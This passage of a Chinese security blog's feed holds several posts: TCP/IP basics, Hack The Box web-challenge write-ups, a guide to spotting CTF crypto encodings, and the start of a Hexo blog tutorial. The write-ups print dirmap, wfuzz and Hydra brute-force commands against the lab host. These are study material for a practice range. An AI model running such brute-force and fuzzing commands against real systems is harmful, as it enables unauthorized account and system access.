data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200309213203.png"></p><p>利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收层则往应用层上走。</p><p>首先作为发送端的客户端在应用层（HTTP协议）发出一个想看某个Web页面的HTTP请求。接着，为了传输方便，在传输层（TCP协议）把从应用层处收到的数据（HTTP请求报文）进行分割，并在各个报文上标记序号及端口号后转发给网络层。在网络层（IP协议），增加作为通信目的地的MAC地址后转发给链路层。</p><p>这种把数据信息包装起来的做法称为封装（encapsulate）。</p><h1 id="与HTTP关系密切的协议：IP、TCP和DNS"><a href="#与HTTP关系密切的协议：IP、TCP和DNS" class="headerlink" title="与HTTP关系密切的协议：IP、TCP和DNS"></a>与HTTP关系密切的协议：IP、TCP和DNS</h1><h2 id="负责传输的IP协议"><a href="#负责传输的IP协议" class="headerlink" title="负责传输的IP协议"></a>负责传输的IP协议</h2><p>IP协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是IP地址和MAC地址。</p><p>IP地址指明了节点被分配到的地址，MAC地址是指网卡所述的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，MAC地址基本上不会更改。</p><p>使用ARP协议凭借MAC地址进行通信。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200309213535.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> Web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox系列——Fuzzy</title>
      <link href="2020/03/01/20200301174951/"/>
      <url>2020/03/01/20200301174951/</url>
      
        <content type="html"><![CDATA[<p>打开实例后的网站。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301175111.png" style="zoom:50%;"><p>点击任何位置，都没有反应，查看源码后分析，该页面没有任何链接能够到其他地方，因此通过工具爆破目录。</p><p>这里使用dirmap工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirmap.py -i http://docker.hackthebox.eu:31822/ -lcf</span><br></pre></td></tr></table></figure><blockquote><p>注：-lcf表示的是读取配置文件，dirmap不支持通过命令行详细配置，通过github下载dirmap后，可以通过包中的README.md进行学习。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301175523.png"></p><p>得到其中存在<code>/api</code>的目录，尝试访问，发现无法访问，那么就再api目录下再进行查找发现，扫不到东西了，那么我们换个思路，是不是在这个目录下就有我们需要的文件呐。</p><p>我们通过chrome插件<code>Wappalyzer</code>知道该网站的编程语言是PHP。</p><p>我们使用dirmap的fuzz模式，扫描api目录下的<code>.php</code>文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirmap.py -i http://docker.hackthebox.eu:31822/api/\&#123;dir\&#125;.php -lcf</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301180545.png"></p><p>访问action.php。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301180658.png"></p><p>提示没有设置属性值，那么现在要猜解传递的属性名，我们通过<code>wfuzz</code>来猜解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hh 24 -c -w /usr/share/wordlists/dirb/big.txt http://docker.hackthebox.eu:31891/api/action.php?FUZZ</span><br></pre></td></tr></table></figure><p>参数解释：</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-c</td><td>输出带颜色，好看</td></tr><tr><td>-w</td><td>指定字典</td></tr><tr><td>–hh</td><td>如下图，wfuzz的输出中有这几项，–hh代表了chars这一列，后面设置的值为当chars值为该值时隐藏，这里表示的就是chars为24时隐藏。其他三者分别为–hc(response)、–hl(lines)、–hw(word)。</td></tr></tbody></table><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301181041.png"></p><p>这里详细解释一下参数<code>--hc/--hl/--hw--hh</code>。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–hc</td><td>通过返回的状态码进行过滤</td></tr><tr><td>–hl</td><td>通过返回的内容的行数</td></tr><tr><td>–hw</td><td>通过返回的内容的字数</td></tr><tr><td>–hh</td><td>通过返回的内容的字符数</td></tr></tbody></table><p>我们这里选择字符是因为，观察直接访问<code>action.php</code>的返回，是一串字符，我们可以猜想当正确的属性名被请求时，返回的字符的数量肯定是不同。</p><p>这里的24是我们先运行一次不加–hh的参数的时候，发现chars这一列的值是24。</p><p>运行后得到结果。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301181922.png"></p><p>然后访问后，提示需要正确的ID值。</p><p>因此继续通过wfuzz来进行猜测具体ID值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hh 27 -c -z range,0-100 http://docker.hackthebox.eu:31891/api/action.php?reset=FUZZ</span><br></pre></td></tr></table></figure><p>参数解释：</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-z</td><td>设置payload的类型，这里是设置一个队列，范围在0-100。</td></tr></tbody></table><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301182307.png"></p><p>最后得到正确的值为20。</p><p>通过网站正常请求后，得到最后的flag。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这次的实验中，因为中间选择字典的问题，wfuzz一直没有爆破出正确的参数名，在仔细看了别人的wp之后，才发现自己用的和别人的不一样，但是这里就又有了一个新的问题，在进行这些敏感目录、敏感文件、参数猜测的爆破时候，选择字典的依据是什么，什么情况下选择怎样的字典，这个问题需要弄清楚。</p><p>然后贴上两个github上的字典：</p><p>fuzzdb</p><p>seclists</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
            <tag> wfuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox系列——Cartographer</title>
      <link href="2020/03/01/20200301173746/"/>
      <url>2020/03/01/20200301173746/</url>
      
        <content type="html"><![CDATA[<p>这是一道很简单的sql注入的题目，打开实例后的网页，就可以看到一个登陆的界面。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301174008.png"></p><p>尝试一下万能的登陆绕过注入。发现成功绕过登陆。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301174236.png" style="zoom:50%;"><p>但是任然没有flag，但是观察url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;docker.hackthebox.eu:31960&#x2F;panel.php?info&#x3D;home</span><br></pre></td></tr></table></figure><p>指定了info的值为home，这个时候就可以换一个参数，是不是就出来flag了呐。</p><p>成功。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200301174457293.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox系列——Lernaean</title>
      <link href="2020/02/29/20200229222500/"/>
      <url>2020/02/29/20200229222500/</url>
      
        <content type="html"><![CDATA[<p>现在开始在<code>Hack The Box</code>中练习，希望可以对您有所帮助。</p><hr><p>这道题目是Challenges-&gt;Web下的Lernaean。我们百度搜索Lernaean，得到的第一个百度百科是水蛇许德拉(Lernaean Hydra)，因此我们可以考虑是通过Hydra进行爆破。</p><p>打开实例化后的网页：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301171013.png" style="zoom:50%;"><p>可以发现只显示一个输入框和一个提交按钮，查看源码，发现是通过POST方式请求。</p><p>现在我们尝试提交一个请求观察返回的变化。</p><p>填入1，点击Submit：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301171214.png" style="zoom:50%;"><p>观察到返回页面中出现<code>Invalid password!</code>的关键字样，因此，可以开始通过Hydra爆破密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 60 -l Administrator -P /usr/share/wordlists/rockyou.txt -o out.txt -f -s 31927 docker.hackthebox.eu http-post-form &quot;/:password=^PASS^:Invalid password&quot;</span><br></pre></td></tr></table></figure><p>解释其中的参数</p><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>-t</td><td>设置线程</td></tr><tr><td>-l</td><td>设置用户名（因该处提交的表单只验证密码，因此用户名设置与结果无关，所以可以随意设置，并符合hydra的规范）</td></tr><tr><td>-P</td><td>设置字典位置</td></tr><tr><td>-o</td><td>结果输出位置</td></tr><tr><td>-f</td><td>匹配到一个之后停止</td></tr><tr><td>-s</td><td>若不是默认端口，设置端口</td></tr><tr><td>http-post-form</td><td>以post请求进行爆破</td></tr><tr><td>docker.hackthebox.eu</td><td>目标域名</td></tr><tr><td>/:password=^PASS^:Invalid password</td><td>通过<code>:</code>分割开，<code>/</code>表示爆破的目录；<code>password=^PASS^</code>表示post请求表单中的数据，<code>^</code>包裹起来的<code>PASS</code>是字典中的条目，<code>Invalid password</code>表示的是登录失败的特征字符串</td></tr></tbody></table><p>运行得到结果：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2020-03-01%E4%B8%8B%E5%8D%885.26.35.png"></p><p>我们填入密码，提交后，得到返回：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200301172826.png" style="zoom:50%;"><p>没有发现任何关于flag的信息，因此想到通过bp进行抓包重放。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/截屏2020-03-01下午5.32.53.png" style="zoom:50%;"><p>在响应包中找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
            <tag> Hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox系列——注册</title>
      <link href="2020/02/29/20200229203020/"/>
      <url>2020/02/29/20200229203020/</url>
      
        <content type="html"><![CDATA[<p>最近在看杨老师的网络安全自学篇系列，再看到后面的时候，杨老师介绍了一个在线的靶场：<code>Hack The Box</code>，亲身体验了一下，感觉是一个检验和提升自己的渗透能力，因此介绍给大家。</p><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p><code>Hack The Box</code>是一个在线平台，可让您测试和提高网络安全技能。负责任地使用它，不要破坏您的同事…</p><p>可以理解该平台是一个在线的靶场，通过类似CTF的形式出题，不过更加接近于真实的环境。通过练习可以学习到各种各样的知识，各种工具的使用。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229204250.png" style="zoom:50%;"><h1 id="0x01-注册"><a href="#0x01-注册" class="headerlink" title="0x01 注册"></a>0x01 注册</h1><p>首先打开官网，向下翻动一小截，发现<code>join</code>。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/1.png" style="zoom:50%;"><p>点击，进入填写邀请码的界面。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229205008.png" style="zoom:50%;"><p>我们可以通过<code>F12</code>或在url前加<code>view-source:</code>来查看源码。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229205735.png" style="zoom:50%;"><p>可以发现其中引用了<code>/js/inviteapi.min.js</code>，访问<code>https://www.hackthebox.eu/js/inviteapi.min.js</code></p><p>可以看到js源码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200229210010434.png"></p><p>观察到其中有<code>makeInviteCode</code>，我们直接在console中执行该方法。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229210133.png"><p>得到base64编码的字符串，通过在线base64解码网站得到：<img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229210243.png"></p><p>需要我们提交一个POST请求，我们这里通过<code>HackBar</code>模拟POST请求。<img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200229215037.png" style="zoom:50%;"></p><p>得到code，发现是base64编码后的，因此再次解码，得到邀请码，填入后，进入注册界面。<img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200229215300030.png" style="zoom:50%;"></p><p>最后的验证码是google的人机验证，你懂得，可查看我的个人博客。</p><p>然后去填入的邮箱，查收邮件，确认注册，你就可以愉快的进行练习了。可以在challenges中查看题目。</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>在找到引用的js文件后，分析代码时，不够仔细认真，没有发现其中明显的<code>makeInvateCode</code>，以后在练习中，一定要耐下心来，审查好每一个关键要素，不要遗漏。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack the box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_crypto常见加密特征</title>
      <link href="2020/02/24/20200224162720/"/>
      <url>2020/02/24/20200224162720/</url>
      
        <content type="html"><![CDATA[<p>我们在刚开始做CTF的crypto的题目时，常会不知道给出的加密后的字符串那种加密方式加密的，因此无法做题，会一个一个的去试，因此这篇文章总结一些常见的加密字符串的特征，供大家查阅。</p><h3 id="Jother编码"><a href="#Jother编码" class="headerlink" title="Jother编码"></a>Jother编码</h3><p>它是一种运用于Javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式，其中少量字符包括”[“，”]”，”{“，”}”，”(“，”)”，”!”，”+”。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;[[]]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;[[]]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;[[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]])()</span><br></pre></td></tr></table></figure><p>这种题目通常直接将内荣复制到浏览器的console中运行即可得到flag。</p><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p>常是用字符所对应的ASCII编码的十进制表示字符，若遇到连续的一堆分割的10进制数不妨通过脚本将十进制对应的字符表示出来。</p><p>例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">84 104 101 32 113 117 105 99 107 32 98</span><br><span class="line">114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116</span><br><span class="line">104 101 32 108 97 122 121 32 100 111 103</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">o_str = <span class="string">&#x27;84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103&#x27;</span></span><br><span class="line">o_str = o_str.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">d_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o_str:</span><br><span class="line">    d_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(d_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Base32-64-58编码"><a href="#Base32-64-58编码" class="headerlink" title="Base32/64/58编码"></a>Base32/64/58编码</h3><p><strong>base32的编码表是由（A-Z、2-7）32个可见字符构成，“=”符号用作后缀填充。</strong><br><strong>base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充。</strong><br><strong>base58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’</strong></p><p>base系列的编码，通常特征值都是在一堆大小写字母和数字后加1-2个等号，若无等号，只存在字母和数字，也可能是base编码，通常是base64。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文：you are so handsome</span><br><span class="line">base64编码：eW91IGFyZSBzbyBoYW5kc29tZQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="rot5-13-18-47"><a href="#rot5-13-18-47" class="headerlink" title="rot5/13/18/47"></a>rot5/13/18/47</h3><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，<br>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，<br>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，将其命名为ROT18。<br>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，用于ROT47编码的字符其ASCII值范围是33－126。</p><h3 id="UUencode-XXencode"><a href="#UUencode-XXencode" class="headerlink" title="UUencode/XXencode"></a>UUencode/XXencode</h3><p>这两种编码和base64都比较相似。</p><p><strong>UUencode</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文：you are so handsome</span><br><span class="line">UUencode编码：3&gt;6]U(&amp;%R92!S;R!H86YD&lt;V]M90&#96;&#96;</span><br></pre></td></tr></table></figure><p>特征：有很多的特殊字符看见。</p><p><strong>XXencode</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文：you are so handsome</span><br><span class="line">XXencode编码：HSKxp643mNG-nPm-cMKtYQqxhNE++</span><br></pre></td></tr></table></figure><p>特征：同base64特别相近。</p><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>通常这种题目会在题目描述的时候提示你是栅栏加密的。当提示我们是栅栏后，我们可以在在线的解密网站一个一个的尝试，然后其中有意义的一组就是我们的flag。</p><p>例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：felhaagv&#123;ewtehtehfilnakgw&#125;</span><br><span class="line">当每组字数为2时，解出：flag&#123;wethinkwehavetheflag&#125;</span><br></pre></td></tr></table></figure><h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><p>这种题目也是，题目描述中会给出，然后直接在线网站破解就行。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200224172717.png"></p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码后的格式是%xx，是该字符对应的ascii码的十六进制表示的前面加<code>%</code>。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</span><br></pre></td></tr></table></figure><h3 id="摩尔斯电码"><a href="#摩尔斯电码" class="headerlink" title="摩尔斯电码"></a>摩尔斯电码</h3><p>摩尔斯电码主要是由<code>.</code> <code>-</code> 组成，每一个字符之间通常用空格来表示，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.-.- ... .- ..- -.- -. . --. -.-- -. . -- ... .- --- ..--.. --.- -.-- -. ..- ...--- -.... .- ---. -.... ----- -.... .--- -.-- ---.. .</span><br><span class="line">. ---.. ----- ----- ----. ..- ---..</span><br></pre></td></tr></table></figure><p>通常还可能用<code>A</code>代替<code>.</code>，用<code>B</code>代替<code>-</code>。</p><p>这种也是直接在网上找在线的破解工具就可以。</p><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码是一种古典加密方式，是替换加密，通常明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p><p>这种题目，一般题目中也是有提示的，告诉你加密方式和偏移量，然后写脚本得到flag就好。</p><h3 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h3><p>特征：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">佛曰：謹蘇那梵即俱薩怯密摩梵耶瑟帝奢諦侄即離盡諳豆栗諳佛實俱老訶漫得曳羯皤曳缽是梵菩提明怯盧切佛舍心怯世怯怛皤世智呐礙盡咒缽有蒙奢耨苦他奢槃密娑耶梵麼奢般者故皤能俱怖呼梵娑多都滅世缽提亦</span><br></pre></td></tr></table></figure><p>遇到这样的，直接在线解密去吧。</p><h3 id="培根加密"><a href="#培根加密" class="headerlink" title="培根加密"></a>培根加密</h3><p>看到一串的A和B，并且五个一组，那么就是培根加密，直接在线解密。</p><h3 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h3><p>当铺密码是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。<br>“羊由大井夫大人王中工”对应的数字为“9158753624”。</p><h3 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h3><p>题目提示是rabbit加密，可以直接通过网站解密。</p><h3 id="在线加解密网站"><a href="#在线加解密网站" class="headerlink" title="在线加解密网站"></a>在线加解密网站</h3><p>最后，粘一些在线加解密的网站。</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+trivas自动发布到github与coding</title>
      <link href="2020/02/22/20200222212413/"/>
      <url>2020/02/22/20200222212413/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>首先，当我们要开始写博客的时候，我们可以有两种选择来发布你写的博客。</p><p>其一，在各大博客平台上发布。选择这条途径的话，我们可以省去一系列的麻烦，只专注与自己的内容即可。但是有好多限制，有些内容不能发布。选择的平台可以有很多，如CSDN，简书等。这两个平台都支持markdown的格式，很方便。</p><p>其二，则是自己搭建一个博客，可以有动态和静态博客的选择。之前也尝试过动态博客的搭建，首先需要有自己的额服务器，<code>github</code>上有着开源的博客框架，大家可以尝试一下，我是太笨，没有成功，各种环境的依赖问题已经炸裂。下面贴上当时尝试的一个<code>Django</code>所写的框架地址。</p><p>然后则是静态博客的搭建，<code>Hexo</code>是一个静态博客的生成框架，使用简单又快速。</p><p>下面的文章便介绍我通过<code>Hexo</code>搭建博客所爬过的坑。</p><p>从开始到结束，按照搭建博客的顺序书写，大家可以按着这个流程搭建，中间遇到问题可以私信我。</p><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>搭建过程所用到的环境：<code>Node.js</code></p><h5 id="第一步，安装Node-js。"><a href="#第一步，安装Node-js。" class="headerlink" title="第一步，安装Node.js。"></a>第一步，安装<code>Node.js</code>。</h5><p>安装后在命令行检查安装是否成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p>若无报错并返回版本号，证明安装成功。</p><h5 id="第二步，安装Hexo"><a href="#第二步，安装Hexo" class="headerlink" title="第二步，安装Hexo"></a>第二步，安装Hexo</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h5 id="第三部，初始化Hexo"><a href="#第三部，初始化Hexo" class="headerlink" title="第三部，初始化Hexo"></a>第三部，初始化Hexo</h5><p>创建一个文件夹<code>myblog</code>，用来存放<code>Hexo</code>所生成的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir myblog</span><br><span class="line">cd myblog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>之后我们在文件夹下可以发现生成了<code>hexo</code>博客的文件，目录结构如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── node_modules</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">│   ├── draft.md</span><br><span class="line">│   ├── page.md</span><br><span class="line">│   └── post.md</span><br><span class="line">├── source</span><br><span class="line">│   └── _posts</span><br><span class="line">└── themes</span><br><span class="line">    └── landscape</span><br></pre></td></tr></table></figure><p>其中我们只需要其中几个目录与文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_config.yml# 站点配置文件，需要按照自己的信息进行配置</span><br><span class="line">package.json# 搭建博客过程中所安装的插件都在该文件中配置，一般不用手动修改</span><br><span class="line">scaffolds# 生成模板，hexo命令生成文件的模板</span><br><span class="line">source# 生成静态博客的源码文件，_posts下是文章的存放位置</span><br><span class="line">themes# 博客主题的安装目录，landscape是默认主题，之后安装的主题也都在这个文件夹下</span><br></pre></td></tr></table></figure><p>现在我们就可以通过以下命令<code>Hexo</code>生成博客了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean# 清理删除public文件夹，每次生成前都需清理</span><br><span class="line">hexo g# 生成博客，可以发现会生成一个public文件夹</span><br><span class="line">hexo s# 本地启动hexo server</span><br></pre></td></tr></table></figure><p>之后就可以通过<code>http://localhost:4000/</code>访问博客。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200222225752.png" style="zoom:50%;"><p>这里我贴出我的站点<code>_config.yml</code>。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 